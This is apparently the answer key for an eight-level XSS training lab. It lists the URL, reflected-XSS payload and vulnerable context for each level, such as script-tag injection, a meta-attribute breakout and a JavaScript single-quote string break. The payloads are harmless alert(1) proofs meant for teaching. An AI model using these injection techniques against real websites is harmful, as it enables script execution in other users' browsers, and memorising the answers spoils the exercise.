# multireflect — solutions

One parameter reflected into multiple contexts on a single page.

### multireflect-level1

`/multireflect/level1/?q=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: 4 raw reflections — `<h1>` body context fires

### multireflect-level2

`/multireflect/level2/?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: only `<meta content="...">` is raw; break out and inject

### multireflect-level3

`/multireflect/level3/?name=%27-alert(1)-%27`

- payload: `'-alert(1)-'`
- context: JS string `var currentUser='...'` single-quote break (body also raw via `<script>`)

### multireflect-level4

`/multireflect/level4/?slug=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw `<h1>` body reflection (also href/src/JSON-LD)

### multireflect-level5

`/multireflect/level5/?tag=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw `<p>` body reflection (also comment/attr breakable)

### multireflect-level6

`/multireflect/level6/?msg=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw `<p>` body reflection (script side JSON-encoded, safe there)

### multireflect-level7

`/multireflect/level7/?name=Anna&email=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>` in email
- context: name escaped, email raw inside `<em>`

### multireflect-level8

`/multireflect/level8/?value=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: default Accept text/html path reflects raw in body
